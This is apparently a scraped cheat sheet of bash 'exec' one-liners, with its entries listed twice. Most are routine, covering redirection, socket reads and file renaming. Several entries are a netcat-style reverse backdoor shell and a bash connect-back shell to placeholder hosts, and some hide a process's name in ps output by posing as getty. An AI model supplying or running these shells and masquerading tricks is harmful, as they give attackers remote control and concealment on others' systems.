# exec

##### Hide the name of a process listed in the `ps` output

   exec  -a "$(ps -fea | awk '{print $8}'| sort -R | head -n1)" your_command -sw1 -sw2

##### Reverse Backdoor Command Shell using Netcat

   exec  5<>/dev/tcp/<your-box>/8080;cat <&5 | while read line; do $line 2>&5 >&5; done

##### Get your external IP address

   exec  3<>/dev/tcp/whatismyip.com/80; echo -e "GET /automation/n09230945.asp HTTP/1.0\r\nHost: whatismyip.com\r\n" >&3; a=( $(cat <&3) ); echo ${a[${#a[*]}-1]};

##### Clean way of re-running bash startup scripts.

   exec  bash

##### Hide the name of a process listed in the `ps` output

   exec  -a "/sbin/getty 38400 tty7" your_cmd -erase_all_files

##### Read and write to TCP or UDP sockets with common bash tools

   exec  5<>/dev/tcp/time.nist.gov/13; cat <&5 & cat >&5; exec 5>&-

##### Connect-back shell using Bash built-ins

   exec  0</dev/tcp/hostname/port; exec 1>&0; exec 2>&0; exec /bin/sh 0</dev/tcp/hostname/port 1>&0 2>&0

##### Reclaim standard in from the tty for a script that is in a pipeline

   exec  0</dev/tty

##### Rename files in a directory in an edited list fashion

   exec  3<&0; ls -1N | while read a; do echo "Rename file: $a"; read -e -i "$a" -p "To: " b <&3 ; [ "$a" == "$b" ] ||  mv -vi "$a" "$b"; done

##### Setting global redirection of STDERR to STDOUT in a script

   exec  2>&1

##### Reverse Backdoor Command Shell using Netcat

   exec  5<>/dev/tcp/<your-box>/8080;cat <&5 | while read line; do $line 2>&5 >&5; done

##### Clean way of re-running bash startup scripts.

   exec  bash

##### Hide the name of a process listed in the `ps` output

   exec  -a "/sbin/getty 38400 tty7" your_cmd -erase_all_files

##### Read and write to TCP or UDP sockets with common bash tools

   exec  5<>/dev/tcp/time.nist.gov/13; cat <&5 & cat >&5; exec 5>&-

##### Connect-back shell using Bash built-ins

   exec  0</dev/tcp/hostname/port; exec 1>&0; exec 2>&0; exec /bin/sh 0</dev/tcp/hostname/port 1>&0 2>&0

##### Reclaim standard in from the tty for a script that is in a pipeline

   exec  0</dev/tty

##### Rename files in a directory in an edited list fashion

   exec  3<&0; ls -1N | while read a; do echo "Rename file: $a"; read -e -i "$a" -p "To: " b <&3 ; [ "$a" == "$b" ] ||  mv -vi "$a" "$b"; done

##### Setting global redirection of STDERR to STDOUT in a script

   exec  2>&1
